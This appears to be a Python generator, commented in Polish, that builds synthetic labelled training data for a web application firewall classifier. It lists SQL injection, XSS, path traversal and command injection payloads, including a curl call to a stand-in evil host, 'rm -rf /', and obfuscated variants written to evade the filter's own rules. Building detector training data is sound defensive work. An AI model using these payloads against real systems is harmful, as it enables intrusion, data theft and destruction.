"""Generator zbioru treningowego dla Content Classifier (spec SPEC.md §7.3).

ponytail: zbiór jest SYNTETYCZNY -- nie mamy jeszcze prawdziwego ruchu
produkcyjnego ani pobranego lokalnie publicznego korpusu (CSIC 2010 /
OWASP CRS test suite), o których mówi §7.3. To, co tu jest, wystarcza
żeby dowieźć cały łańcuch dataset -> trening -> metryki -> podmieniony
scorer end-to-end (kontrakt z §7.1/FR-13) i wykryć realne wady
heurystyki/reguł na przykładach, które celowo mylą prostym dopasowaniem
słów kluczowych (np. zdania z "OR"/"SELECT" w normalnym języku).
Przed treningiem produkcyjnym zastąpić prawdziwymi danymi -- patrz
otwarte pytania w SPEC.md §15.

Każda próbka przechodzi przez PRAWDZIWY pipeline (rules.evaluate +
features.extract) tego repo, więc cechy w zbiorze treningowym są
dokładnie tymi samymi cechami, które scorer zobaczy w produkcji.
"""
from __future__ import annotations

import random
from dataclasses import asdict, fields

from app.waf.features import Features, extract
from app.waf.request import WafRequest
from app.waf.rules import evaluate
from app.waf.session_store import SessionStore

FEATURE_NAMES: list[str] = [f.name for f in fields(Features)]

BENIGN_PATHS = [
    "/", "/products", "/products/42", "/products/17/reviews", "/search",
    "/api/v1/users/123", "/cart", "/checkout", "/blog/how-to-bake-bread",
    "/account/settings", "/static/logo.png", "/api/v1/orders/9981",
    "/login", "/logout", "/about-us", "/contact", "/pricing",
]

BENIGN_QUERIES = [
    {}, {"q": ["laptop bag"]}, {"category": ["shoes"]}, {"page": ["2"]},
    {"sort": ["price_asc"]}, {"id": ["4821"]}, {"lang": ["pl"]},
    {"ref": ["newsletter_march"]}, {"tag": ["sale", "new"]},
]

# Zdania celowo zawierające słowa kluczowe reguł SQLi/logiki boolowskiej
# w normalnym, niegroźnym kontekście językowym -- to jest dokładnie ten
# rodzaj FP, którego czysta heurystyka/regex nie potrafi odróżnić, a
# model powinien się tego nauczyć z cech kontekstowych (entropia,
# długość, brak faktycznego trafienia reguły o wysokiej wadze).
BENIGN_BODIES = [
    '{"name": "Jan Kowalski", "email": "jan@example.com"}',
    '{"comment": "Great product, will buy again."}',
    '{"comment": "Please select the plan that suits you best."}',
    '{"comment": "I need one or two more days to decide."}',
    '{"comment": "This or that, either option works for me."}',
    '{"comment": "You are the union of talent and dedication."}',
    "username=jan.kowalski&remember_me=true",
    '{"address": "ul. Kwiatowa 5, 00-001 Warszawa"}',
    '{"feedback": "Support team and delivery were both excellent."}',
    "",
]

# (kategoria, payload) -- zawiera warianty wprost i obfuskowane
# (podwójny url-encoding, mieszana wielkość liter), zgodnie z §7.5
# (odporność na obejścia).
MALICIOUS_PAYLOADS: list[tuple[str, str]] = [
    ("sqli", "' OR '1'='1"),
    ("sqli", "1 UNION SELECT username, password FROM users"),
    ("sqli", "1'; DROP TABLE users; --"),
    ("sqli", "admin'--"),
    ("sqli", "1%2527%2520UNION%2520SELECT%2520pass"),  # double-encoded
    ("sqli", "1 AnD 1=1"),  # mieszana wielkość liter
    ("xss", "<script>alert(document.cookie)</script>"),
    ("xss", "<img src=x onerror=alert(1)>"),
    ("xss", "javascript:alert(document.cookie)"),
    ("xss", "<SCRIPT>alert(1)</SCRIPT>"),
    ("path_traversal", "../../../../etc/passwd"),
    ("path_traversal", "..\\..\\..\\windows\\system32\\config\\sam"),
    ("path_traversal", "/files/../../../../etc/passwd"),
    ("command_injection", "8.8.8.8; cat /etc/passwd"),
    ("command_injection", "test`whoami`"),
    ("command_injection", "$(rm -rf /)"),
    ("command_injection", "127.0.0.1 && curl evil.example.com"),
]

MALICIOUS_FIELD_SLOTS = ["query:id", "query:search", "query:input", "body", "path"]

# Payloady dobrane tak, żeby ŚWIADOMIE ominąć obecne reguły z rules.py
# (rule_hit_count=0 dla tych próbek) -- sprawdzają, czy model daje sobie
# radę wyłącznie na cechach entropii/długości/zachowania, gdy warstwa 1
# nic nie złapała. To realny test odporności na obejścia (spec §7.5),
# nie tylko "czy model nauczył się reguł na nowo".
EVASIVE_PAYLOADS: list[tuple[str, str]] = [
    ("sqli", "1 UN/**/ION SEL/**/ECT password FROM users"),  # rozbite słowo kluczowe
    ("sqli", "1 OR CONCAT(0x27,0x31,0x27)=CONCAT(0x27,0x31,0x27)"),  # bez '=' wprost między liczbami
    ("path_traversal", "..%c0%af..%c0%afetc%c0%afpasswd"),  # overlong UTF-8 '/' -- nie dekoduje się do '/'
    ("command_injection", "8.8.8.8\ncat /etc/passwd"),  # separator to newline, nie ; | &&
    ("command_injection", "127.0.0.1\nwhoami"),
]


def _make_evasive_request() -> WafRequest:
    _, payload = random.choice(EVASIVE_PAYLOADS)
    slot = random.choice(["query:id", "query:search", "body"])
    return _apply_payload_to_request(payload, slot)


def _make_brute_force_request(store: SessionStore, now: float, rng: random.Random) -> WafRequest:
    """Atak czysto behawioralny: żadnego payloadu injection, tylko wysoka
    częstotliwość żądań do jednego endpointu (credential stuffing/brute
    force) -- to klasa ataku, którą reguły statyczne z definicji nie
    widzą (nie ma sygnatury do dopasowania), a AI Scoring Engine ma za
    zadanie wykryć po zachowaniu (spec §1.2, §7.1 "Traffic anomaly")."""
    client_ip = f"203.0.113.{rng.randint(1, 254)}"
    path = "/login"
    guess = rng.choice(["password123", "qwerty", "letmein", "admin123", "welcome1"])
    req = WafRequest(method="POST", path=path, client_ip=client_ip,
                      body=f"username=admin&password={guess}")
    n_prior = rng.randint(20, 80)  # dziesiątki prób logowania w krótkim oknie
    _simulate_session_history(store, client_ip, path, n_prior, now)
    return req


def _apply_payload_to_request(payload: str, slot: str) -> WafRequest:
    path = random.choice(BENIGN_PATHS)
    query: dict[str, list[str]] = {}
    body = ""

    if slot == "path":
        path = f"{path}/{payload}"
    elif slot == "body":
        body = payload
    else:
        _, param_name = slot.split(":")
        query[param_name] = [payload]

    return WafRequest(method=random.choice(["GET", "POST"]), path=path,
                       client_ip=f"10.0.{random.randint(0, 255)}.{random.randint(1, 254)}",
                       query=query, body=body)


def _make_benign_request() -> WafRequest:
    return WafRequest(
        method=random.choice(["GET", "GET", "GET", "POST"]),
        path=random.choice(BENIGN_PATHS),
        client_ip=f"10.0.{random.randint(0, 255)}.{random.randint(1, 254)}",
        query=dict(random.choice(BENIGN_QUERIES)),
        body=random.choice(BENIGN_BODIES),
    )


def _simulate_session_history(store: SessionStore, client_ip: str, path: str,
                               n_prior_requests: int, now: float) -> None:
    for i in range(n_prior_requests):
        store.record(client_ip, path, now=now - (n_prior_requests - i))


def build_dataset(n_benign: int = 600, n_malicious: int = 600, seed: int = 42,
                   ) -> tuple[list[dict[str, float]], list[int]]:
    """Zwraca (X, y): X to lista wektorów cech (dict), y to etykiety 0=benign/1=malicious."""
    rng = random.Random(seed)
    random.seed(seed)  # helpers powyżej używają globalnego `random` dla zwięzłości

    X: list[dict[str, float]] = []
    y: list[int] = []
    store = SessionStore()
    now = 1_700_000_000.0

    for _ in range(n_benign):
        req = _make_benign_request()
        # większość klientów ma normalny, niski ruch; nieliczni "power
        # userzy" mają wysoki -- model nie powinien karać samej częstości
        n_prior = rng.choice([0, 0, 0, 1, 2, 5, 20])
        _simulate_session_history(store, req.client_ip, req.path, n_prior, now)
        matches = evaluate(req)
        client_state = store.record(req.client_ip, req.path, now=now)
        feats = extract(req, matches, client_state)
        X.append(asdict(feats))
        y.append(0)

    # Mieszanka klasy "malicious": większość to jawne trafienia regexem
    # (łatwe), część to celowe obejścia regexa (trudne, §7.5), reszta to
    # atak czysto behawioralny bez żadnego payloadu (brute force).
    n_evasive = max(1, n_malicious // 6)
    n_brute_force = max(1, n_malicious // 6)
    n_obvious = n_malicious - n_evasive - n_brute_force

    for _ in range(n_obvious):
        category, payload = rng.choice(MALICIOUS_PAYLOADS)
        slot = rng.choice(MALICIOUS_FIELD_SLOTS)
        req = _apply_payload_to_request(payload, slot)
        # część ataków to pojedynczy strzał (n_prior=0) -- sygnał musi
        # wystarczyć z samej treści, nie tylko z częstotliwości.
        n_prior = rng.choice([0, 0, 1, 10, 30, 60])
        _simulate_session_history(store, req.client_ip, req.path, n_prior, now)
        matches = evaluate(req)
        client_state = store.record(req.client_ip, req.path, now=now)
        feats = extract(req, matches, client_state)
        X.append(asdict(feats))
        y.append(1)

    for _ in range(n_evasive):
        req = _make_evasive_request()
        n_prior = rng.choice([0, 0, 1])
        _simulate_session_history(store, req.client_ip, req.path, n_prior, now)
        matches = evaluate(req)
        client_state = store.record(req.client_ip, req.path, now=now)
        feats = extract(req, matches, client_state)
        X.append(asdict(feats))
        y.append(1)

    for _ in range(n_brute_force):
        req = _make_brute_force_request(store, now, rng)
        matches = evaluate(req)
        client_state = store.record(req.client_ip, req.path, now=now)
        feats = extract(req, matches, client_state)
        X.append(asdict(feats))
        y.append(1)

    return X, y
